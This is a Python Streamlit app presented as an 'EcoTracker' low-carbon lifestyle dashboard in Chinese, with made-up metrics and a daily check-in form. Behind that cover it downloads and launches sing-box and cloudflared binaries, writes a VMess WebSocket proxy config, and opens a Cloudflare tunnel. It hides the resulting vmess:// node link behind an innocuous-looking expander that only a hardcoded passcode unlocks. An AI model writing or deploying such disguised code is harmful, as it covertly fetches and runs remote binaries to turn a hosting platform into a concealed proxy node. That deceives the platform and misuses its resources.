import os, json, base64, platform, subprocess, time, tarfile
from pathlib import Path
import urllib.request
import streamlit as st

BASE_DIR = Path("/tmp/.agsb_stable").resolve()
UID = st.secrets.get("UUID", "")
TOKEN = st.secrets.get("TOKEN", "")
DOMAIN = st.secrets.get("DOMAIN", "")
PORT = 49999
WS_PATH = f"/{UID[:8]}-vm"

@st.cache_resource
def setup_and_start_services():
    if not BASE_DIR.exists(): 
        BASE_DIR.mkdir(parents=True)
    os.chdir(BASE_DIR)
    
    arch = "amd64" if "x86_64" in platform.machine() else "arm64"
    sb_bin, cf_bin = BASE_DIR / "sing-box", BASE_DIR / "cloudflared"

    if not sb_bin.exists():
        urllib.request.urlretrieve(f"https://github.com/SagerNet/sing-box/releases/download/v1.8.5/sing-box-1.8.5-linux-{arch}.tar.gz", "sb.tar.gz")
        with tarfile.open("sb.tar.gz") as tar:
            for m in tar.getmembers():
                if m.name.endswith("sing-box"):
                    m.name = os.path.basename(m.name)
                    tar.extract(m, path=BASE_DIR, filter='data' if hasattr(tarfile, 'data_filter') else None)
        sb_bin.chmod(0o755)

    if not cf_bin.exists():
        urllib.request.urlretrieve(f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}", cf_bin)
        cf_bin.chmod(0o755)

    os.system("pkill -9 sing-box >/dev/null 2>&1")
    os.system("pkill -9 cloudflared >/dev/null 2>&1")
    time.sleep(0.2)

    with open("sb.json", "w") as f: 
        json.dump({
            "log": {"level": "error"},
            "inbounds": [{
                "type": "vmess", "listen": "127.0.0.1", "listen_port": PORT,
                "users": [{"uuid": UID}], 
                "sniff": True,
                "transport": {"type": "ws", "path": WS_PATH}
            }],
            "outbounds": [{"type": "direct"}]
        }, f)

    subprocess.Popen([str(sb_bin), "run", "-c", "sb.json"], start_new_session=True)
    subprocess.Popen([str(cf_bin), "tunnel", "--no-autoupdate", "run", "--token", TOKEN], start_new_session=True)
    
    return "vmess://" + base64.b64encode(json.dumps({
        "v":"2", "ps":"Streamlit-Node", "add":DOMAIN, "port":"443", "id":UID, 
        "net":"ws", "host":DOMAIN, "path":WS_PATH, "tls":"tls", "sni":DOMAIN
    }).encode()).decode()

def main():
    st.set_page_config(page_title="EcoTracker", page_icon="🌱", layout="centered")
    st.markdown("<style>#MainMenu {visibility: hidden;} footer {visibility: hidden;}</style>", unsafe_allow_html=True)
    
    link = setup_and_start_services() if TOKEN and DOMAIN and UID else ""

    st.title("🌱 EcoTracker 低碳生活看板")
    st.markdown("欢迎来到个人绿色低碳生活监测中心。通过记录日常行为，践行可持续发展理念，守护绿色地球。")
    
    col1, col2, col3 = st.columns(3)
    with col1: st.metric(label="本月步行/骑行里程", value="42.5 km", delta="↑ 12%")
    with col2: st.metric(label="节约生活用水", value="180 L", delta="↑ 5%")
    with col3: st.metric(label="减少碳排放总量", value="12.8 kg", delta="↓ 8%")

    st.write("---")
    st.subheader("📊 每日低碳行为打卡")
    commute = st.selectbox("今日出行方式", ["步行/自行车 (0碳排)", "公共交通/地铁", "新能源汽车", "燃油私家车"])
    meals = st.checkbox("今日践行“光盘行动”，无食物浪费")
    garbage = st.checkbox("今日已完成生活垃圾分类投放")
    
    if st.button("提交今日数据并计算减排"):
        score = 50 if commute == "步行/自行车 (0碳排)" else (30 if commute == "公共交通/地铁" else 0)
        score += 20 if meals else 0
        score += 20 if garbage else 0
        st.info(f"感谢打卡！今日低碳生活指数：**{score}/100**。继续保持！")

    st.write("---")
    st.subheader("💡 绿色环保小常识")
    with st.expander("1. 什么是‘碳中和’（Carbon Neutrality）？"):
        st.write("碳中和是指企业、团体或个人测算在一定时间内直接或间接产生的温室气体排放总量，通过植树造林等形式抵消自身产生的二氧化碳排放量，实现二氧化碳“零排放”。")
    with st.expander("2. 日常生活中有哪些行之有效的低碳习惯？"):
        st.write("• 随手关灯、拔掉闲置电器插头；\n• 尽量选择公共交通或绿色出行；\n• 减少一次性塑料制品的使用。")

    # ================= 暗号依然为: green2026 =================
    with st.expander("3. 区域网络节点碳补偿数据监测认证（系统核验）"):
        st.caption("注：此模块仅供个人节点数据核验与设备同步使用。")
        secret_key = st.text_input("请输入核验授权码 (Access Code)", type="password")
        
        if secret_key == "green2026": 
            if link: st.code(link)
            else: st.error("核心 secrets 配置不完整，无法生成通道。")
        elif secret_key != "":
            st.error("授权码校验失败，无访问权限。")

    st.write("---")
    st.caption(f"系统运行环境：Debian Linux | 核心状态：🟢 正常运作 | 数据同步时间：{time.strftime('%X')}")

if __name__ == "__main__":
    main()
